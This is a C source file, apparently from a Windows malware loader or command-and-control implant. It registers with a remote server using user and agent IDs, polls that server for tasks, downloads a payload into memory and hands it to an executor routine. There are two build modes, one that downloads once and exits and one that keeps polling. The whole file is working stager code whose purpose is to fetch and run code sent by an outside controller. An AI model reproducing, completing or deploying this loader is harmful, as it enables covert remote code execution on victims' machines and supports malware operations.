#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"
#include "../../includes/parser/parser.h"


BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter) {
	switch (info.code) {
	case TASK_LOAD:
		if(!LdrRunExe(info))
			return FALSE;
		return TRUE;
	// case FILE_DLL:
	// 	if(!LdrRunDLL(info))
	// 		return FALSE;
	// 	return TRUE;
	}
}


#ifdef LOAD_AND_EXIT

LdrTask LdrPullFile() {
	LdrTask task = {0};
	ParserWrite *writer = ParserInitWrite();
	if(!writer) {
		task.ok = FALSE;
		return task;
	}

	if(!NwLoadApis()) {
		task.ok = FALSE;
		return task;
	}

	if(!ParserWrite4(writer, MSG_GET_FILE)) {
		task.ok = FALSE;
		return task;
	}
	INT BytesWrote = ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
	if(BytesWrote == 0) {
		task.ok = FALSE;
		return task;
	}

	BytesWrote = ParserWriteBytes(writer, ldr->config->AgentId, sizeof(ldr->config->AgentId));
	if(BytesWrote == 0) {
		task.ok = FALSE;
		return task;
	}


	BytesWrote = ParserWriteBytes(writer, ldr->config->FileId, sizeof(ldr->config->FileId));
	if(BytesWrote == 0) {
		task.ok = FALSE;
		return task;
	}


	DWORD payloadSize = 0;
	PVOID payload = NwPollServer(&payloadSize,
    ParserWriteReturnPointer(writer),
    (DWORD)ParserWriteReturnSize(writer));
	if(!payload) {
		task.ok = FALSE;
		return task;
	}

	ParserClearWrite(writer);

	ParserRead *pr = ParserInitRead(payload, payloadSize);
	task.code = ParserRead4(pr);
	task.FileType = ParserRead4(pr);
	task.DataSize = ParserRead4(pr);

	task.Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
    if(!task.Data) {
        task.ok = FALSE;
        ParserClearRead(pr);
        return task;
    }
    ParserReadBytes(pr, task.Data, task.DataSize);
    task.ok = TRUE;
    ParserClearRead(pr);
    ldr->win32->LocalFree(payload);
    return task;
}
#endif


#ifdef LOAD_AND_LISTEN

static PBYTE  sPollBody;
static DWORD  sPollSize;

void LdrInitPoll() {
    DBGA("[+] Loading apis and crafting base struct\n");
    NwLoadApis();
    ParserWrite *writer = ParserInitWrite();
    ParserWrite4(writer, POLL_CODE);
    ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
    ParserWriteBytes(writer, ldr->config->AgentId, sizeof(ldr->config->AgentId));
    sPollBody = ParserWriteReturnPointer(writer);
    sPollSize = (DWORD)ParserWriteReturnSize(writer);
}

LdrTask LdrPollServer() {
    LdrTask task = {0};
    DWORD PayloadSize = 0;
    DBGA("[*] Polling Server\n");
    PVOID Addr = NwPollServer(&PayloadSize, sPollBody, sPollSize);
    if(!Addr) {
		DBGA("[*] Failed Polling Server\n");

        task.ok = FALSE;
        return task;
    }

    ParserRead *pr = ParserInitRead(Addr, PayloadSize);
    task.code = ParserRead4(pr);
    if(task.code == TASK_NO_TASK) {
		DBGA("[*] No task\n");
        ParserClearRead(pr);
        ldr->win32->LocalFree(Addr);
        return task;
    }
    task.FileType = ParserRead4(pr);
    task.DataSize = ParserRead4(pr);
    PBYTE Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
    if(!Data) {
		DBGA("[*] Failed Allocating\n");
        task.ok = FALSE;
        ParserClearRead(pr);
        ldr->win32->LocalFree(Addr);
        return task;
    }
    ParserReadBytes(pr, Data, task.DataSize);

    task.Data = Data;
    task.ok = TRUE;
    ldr->win32->LocalFree(Addr);
    return task; 

}
#endif

